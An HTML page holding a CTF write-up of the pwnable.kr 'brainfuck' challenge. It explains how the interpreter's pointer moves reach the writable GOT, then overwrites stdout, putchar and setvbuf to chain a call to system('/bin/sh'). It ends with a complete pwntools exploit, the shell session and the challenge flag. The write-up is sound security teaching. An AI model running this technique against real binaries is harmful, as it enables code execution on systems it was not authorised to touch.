@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="description" content="Detailed pwnable.kr brainfuck writeup covering GOT overwrite, function chaining via setvbuf and putchar, and gaining a shell through a brainfuck interpreter exploit." />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>pwnable.kr: brainfuck Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="canonical" href="https://yaelshechter.github.io/pwnable-brainfuck.html" />
+    <meta property="og:type" content="article" />
+    <meta property="og:site_name" content="Yael Shechter - Security Research" />
+    <meta property="og:title" content="pwnable.kr: brainfuck Writeup" />
+    <meta property="og:description" content="Detailed pwnable.kr brainfuck writeup covering GOT overwrite, function chaining via setvbuf and putchar, and gaining a shell through a brainfuck interpreter exploit." />
+    <meta property="og:url" content="https://yaelshechter.github.io/pwnable-brainfuck.html" />
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:title" content="pwnable.kr: brainfuck Writeup" />
+    <meta name="twitter:description" content="Detailed pwnable.kr brainfuck writeup covering GOT overwrite, function chaining via setvbuf and putchar, and gaining a shell through a brainfuck interpreter exploit." />
+
+    <script type="application/ld+json">
+        {
+            "@context": "https://schema.org",
+            "@type": "TechArticle",
+            "headline": "pwnable.kr brainfuck Writeup - GOT Overwrite and Function Chaining",
+            "author": {
+                "@type": "Person",
+                "name": "Yael Shechter",
+                "url": "https://yaelshechter.github.io/"
+            },
+            "datePublished": "2026-03-01",
+            "dateModified": "2026-03-01",
+            "keywords": ["pwnable.kr", "brainfuck", "GOT overwrite", "function chaining", "binary exploitation", "CTF writeup"],
+            "url": "https://yaelshechter.github.io/pwnable-brainfuck.html"
+        }
+    </script>
+
+    <!-- Syntax highlighting -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    <link rel="stylesheet" href="css/writeup.css">
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-88239B8JH3"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-88239B8JH3');
+    </script>
+</head>
+<body>
+<div class="container">
+    <header>
+        <a href="index.html" class="back-link">Back to writeups</a>
+        <h1>pwnable.kr: brainfuck writeup</h1>
+        <div class="meta">
+            <span>📅 Mar 2026</span>
+            <span>🏆 100 points</span>
+            <span>📂 Rookiss</span>
+        </div>
+        <div class="tags">
+            <span class="tag">GOT overwrite</span>
+            <span class="tag">function chaining</span>
+            <span class="tag">brainfuck</span>
+            <span class="tag">libc</span>
+        </div>
+    </header>
+
+    <article>
+        <img src="images/pwnable-banner.png" alt="pwnable.kr banner" class="banner" />
+        <h2>Challenge Description</h2>
+
+        <p>We get the following hint:</p>
+
+        <pre><code>I made a simple brain-fuck language emulation program written in C.
+The [ ] commands are not implemented yet. However the rest functionality seems working fine.
+Find a bug and exploit it to get a shell.
+
+ssh brainfuck@pwnable.kr -p2222 (pw: guest)</code></pre>
+
+        <p>Let's connect:</p>
+
+        <pre><code>ssh brainfuck@pwnable.kr -p2222</code></pre>
+
+        <p>In the home directory we see:</p>
+
+        <pre><code>brainfuck  libc-2.23.so  readme</code></pre>
+
+        <p>The readme tells us to connect on port 9032. We have the binary, a libc, and a flag.</p>
+
+        <h2>Understanding the Binary</h2>
+
+        <p>I decompiled the binary with Ghidra and got the two main functions: <code>main()</code> and <code>do_brainfuck()</code>.</p>
+
+        <pre><code>undefined4 main(void)
+{
+  // ...
+  setvbuf(stdout,(char *)0x0,2,0);
+  setvbuf(stdin,(char *)0x0,1,0);
+  p = tape;
+  puts("welcome to brainfuck testing system!!");
+  puts("type some brainfuck instructions except [ ]");
+  memset(input_buf,0,0x400);
+  fgets(input_buf,0x400,stdin);
+  idx = 0;
+  while( true ) {
+    len_of_input = strlen(input_buf);
+    if (len_of_input &lt;= idx) break;
+    do_brainfuck((int)input_buf[idx]);
+    idx = idx + 1;
+  }
+  // stack canary check...
+  return 0;
+}</code></pre>
+
+        <pre><code>void do_brainfuck(int brainfuck_char)
+{
+  int input_char;
+  char *char_from_p;
+
+  char_from_p = p;
+  switch((char)brainfuck_char) {
+  case '+':
+    *p = *p + '\x01';
+    break;
+  case ',':
+    input_char = getchar();
+    *char_from_p = (char)input_char;
+    break;
+  case '-':
+    *p = *p + -1;
+    break;
+  case '.':
+    putchar((int)*p);
+    break;
+  case '&lt;':
+    p = p + -1;
+    break;
+  case '&gt;':
+    p = p + 1;
+    break;
+  case '[':
+    puts("[ and ] not supported.");
+  }
+  return;
+}</code></pre>
+
+        <p>The interpreter uses a global pointer <code>p</code> initialized to <code>tape</code>, a fixed address in the data segment at <code>0x804a0a0</code>. The <code>&lt;</code> and <code>&gt;</code> commands move the pointer back and forth, <code>,</code> lets us write a byte from stdin to wherever the pointer is, <code>.</code> prints the byte at the pointer, and <code>+</code>/<code>-</code> increment and decrement the byte there.</p>
+
+        <p>So we can navigate around memory, read values, and write values. Very interesting.</p>
+
+        <p>Running <code>checksec --file=./brainfuck</code>:</p>
+
+        <pre><code>Arch:       i386-32-little
+RELRO:      Partial RELRO
+Stack:      Canary found
+NX:         NX enabled
+PIE:        No PIE (0x8048000)</code></pre>
+
+        <p>Partial RELRO means the GOT is still writable (as opposed to full RELRO). It does move the GOT above the program's variables so you can't overflow into it, but that doesn't prevent us from overwriting entries directly since it's writable, which is exactly what <code>&lt;</code> and <code>,</code> give us.</p>
+
+        <p>Using <code>&lt;</code> to go back in memory addresses, we can move above the location of the start of the tape (<code>0x804a0a0</code>) and get to the GOT which happens to live there.</p>
+
+        <h2>Memory Layout</h2>
+
+        <p>The tape sits in the data segment at <code>0x804a0a0</code>, and the GOT entries are just above it:</p>
+
+        <pre><code>[0x804a00c] getchar@GLIBC_2.0 -&gt; 0x8048446 (getchar@plt+6)
+[0x804a010] fgets@GLIBC_2.0 -&gt; 0x8048456 (fgets@plt+6)
+[0x804a018] puts@GLIBC_2.0 -&gt; 0x8048476 (puts@plt+6)
+[0x804a020] strlen@GLIBC_2.0 -&gt; 0x8048496 (strlen@plt+6)
+[0x804a028] setvbuf@GLIBC_2.0 -&gt; 0x80484b6 (setvbuf@plt+6)
+[0x804a02c] memset@GLIBC_2.0 -&gt; 0x80484c6 (memset@plt+6)
+...
+[0x804a060] stdout
+...
+[0x804a0a0] tape  ← p starts here</code></pre>
+
+        <p>By moving the pointer left with <code>&lt;</code>, we can reach any GOT entry. The distance from the tape to the GOT is around 100-150 bytes, and the input size is limited to 1024, so we have plenty of place. With <code>.</code> we can leak resolved libc addresses, and with <code>,</code> or <code>+</code>/<code>-</code> we can overwrite them.</p>
+
+        <hr>
+
+        <h2>First Attempt: Overwrite putchar with system</h2>
+
+        <p>My first idea was to leak a libc address from putchar's GOT entry, calculate system's address, and write it back. Then when <code>.</code> is called, it would call <code>system</code> instead of <code>putchar</code>.</p>
+
+        <p>The leak worked: move the pointer to putchar's GOT, use <code>.</code> to print each byte, calculate the libc base. But the problem was the argument. <code>putchar</code> receives a single byte value (the tape cell), not a pointer. So <code>system</code> would get called with something like <code>system(0x62)</code> and it would try to read a command from address <code>0x62</code> and crash.</p>
+
+        <h2>Second Attempt: Overwrite getchar with system</h2>
+
+        <p>Next I tried overwriting getchar's GOT instead, hoping its argument would be more useful. I noticed that somehow in GDB in each run there was always the same value in the stack right when the function is called, and this value is controlled by me (by inputting the brainfuck string). And I could use any chars, not just the brainfuck charset. I used <code>+</code>/<code>-</code> to apply the fixed delta between getchar and system within the same libc (so ASLR doesn't matter).</p>
+
+        <p>The delta byte-by-byte (from libc-2.23.so):</p>
+
+        <pre><code>getchar: 0x00065b50
+system:  0x0003adb0
+
+byte 0: 0x50 → 0xb0, "+" × 96
+byte 1: 0x5b → 0xad, "+" × 82
+byte 2: 0x06 → 0x03, "-" × 3
+byte 3: no change</code></pre>
+
+        <p>I put <code>/bin/sh;#</code> in the brainfuck code itself at a specific offset so it would land on the stack where system's argument pointed. The <code>;#</code> was needed because the brainfuck code after it (<code>&lt;&lt;&lt;+++</code> etc.) would be interpreted by the shell, <code>;</code> ends the command and <code>#</code> comments out the rest.</p>
+
+        <p>This worked locally with ASLR off! But remotely, the stack layout was different (different environment variables shift the stack), so the pointer didn't land on my string. The argument was consistently garbage: <code>sh: 1: \x81\xc6\x15X\x01: not found</code>. I tried brute-forcing the offset but couldn't solve it this way.</p>
+
+        <hr>
+
+        <h2>The Solution: GOT Chaining</h2>
+
+        <p>The key idea was to stop relying on the stack and instead chain function calls using only GOT entries and fixed binary addresses (no PIE means these never change).</p>
+
+        <p>The trick is to make the program call <code>system</code> with a pointer to a string we control, using only things at known addresses. Here's how:</p>
+
+        <p>First, I write <code>/bin/sh</code> to the tape (<code>0x804a0a0</code>) using the <code>,</code> operator. The tape is at a fixed address, so now we have our command string at a known location.</p>
+
+        <p>Then I overwrite three GOT entries:</p>
+
+        <ul>
+            <li><code>stdout</code> → <code>0x804a0a0</code> (the tape, where <code>/bin/sh</code> lives)</li>
+            <li><code>putchar</code> → <code>0x08048671</code> (the address of <code>main</code>)</li>
+            <li><code>setvbuf</code> → <code>system</code> (using <code>+</code>/<code>-</code> deltas from the resolved address)</li>
+        </ul>
+
+        <p>Finally, I trigger <code>.</code>, which calls <code>putchar</code>. But <code>putchar</code> now points to <code>main</code>, so the program restarts. The first thing <code>main</code> does is call <code>setvbuf(stdout, ...)</code>. Since we overwrote <code>setvbuf</code> to point to <code>system</code> and <code>stdout</code> to point to the tape, this becomes <code>system(0x804a0a0)</code>, which executes <code>/bin/sh</code>. Shell!</p>
+
+        <p>Everything here is at a fixed address, stack is not involved at all.</p>
+
+        <h3>Why +/- instead of stdin (",") for setvbuf</h3>
+
+        <p>For <code>stdout</code> and <code>putchar</code>, I used <code>,</code> to write exact values byte by byte from stdin. But for <code>setvbuf</code> I used <code>+</code>/<code>-</code> because the delta between <code>setvbuf</code> and <code>system</code> is constant within the same libc, regardless of ASLR. The resolved <code>setvbuf</code> address changes each run, but <code>setvbuf_addr + fixed_delta = system_addr</code> always holds.</p>
+
+        <p>Remote deltas (from libc-2.23.so):</p>
+
+        <pre><code>setvbuf: 0x00060370
+system:  0x0003adb0
+
+byte 0: 0x70 → 0xb0, + × 64
+byte 1: 0x03 → 0xad, - × 86
+byte 2: 0x06 → 0x03, - × 3
+byte 3: no change</code></pre>
+
+        <h3>Navigation Distances</h3>
+
+        <p>After writing the command (7 bytes for <code>/bin/sh</code>), the pointer is at tape+6. From there:</p>
+
+        <pre><code>tape+6   → stdout  (0x804a060): 70 left
+stdout+3 → putchar (0x804a030): 51 left
+putchar+3 → setvbuf (0x804a028): 11 left</code></pre>
+
+        <h2>The Exploit</h2>
+
+        <pre><code>from pwn import *
+
+tape      = 0x804a0a0
+stdout    = 0x804a060
+putchar   = 0x804a030
+setvbuf   = 0x804a028
+main      = 0x08048671
+
+libc = ELF('./libc-2.23.so')
+
+def delta(src, dst):
+    bf = b''
+    for i in range(4):
+        d = ((dst &gt;&gt; i*8) - (src &gt;&gt; i*8)) % 256
+        bf += b'+' * d if d &lt;= 128 else b'-' * (256 - d)
+        if i &lt; 3: bf += b'&gt;'
+    return bf
+
+def goto(fr, to):
+    return b'&lt;' * (fr - to)
+
+def write4():
+    return b',&gt;,&gt;,&gt;,'
+
+cmd = b'/bin/sh'
+
+bf  = b',&gt;' * (len(cmd)-1) + b',.'          # write cmd to tape. "." to resolve putchar's GOT entry.
+bf += goto(tape+len(cmd)-1, stdout) + write4()   # stdout → tape
+bf += goto(stdout+3, putchar) + write4()          # putchar → main
+bf += goto(putchar+3, setvbuf)                    # go to setvbuf
+bf += delta(libc.sym['setvbuf'], libc.sym['system'])  # setvbuf → system
+bf += b'.'                                        # trigger chain
+
+data = cmd + p32(tape) + p32(main)
+
+p = remote('pwnable.kr', 9001)
+p.recvuntil(b'type some brainfuck instructions except [ ]\n')
+p.send(bf + b'\n' + data)
+p.interactive()</code></pre>
+
+        <p>Running <code>python3 exploit.py</code>:</p>
+
+        <pre><code>[+] Opening connection to pwnable.kr on port 9001: Done
+[*] Switching to interactive mode
+$ ls
+brainfuck_pwn
+$ cd brainfuck_pwn
+$ cat flag
+bR41n_F4ck_Is_FuN_LanguaG3</code></pre>
+
+        <p>Bazinga :)</p>
+
+    </article>
+</div>
+<script src="js/writeup.js"></script>
+</body>
+</html>
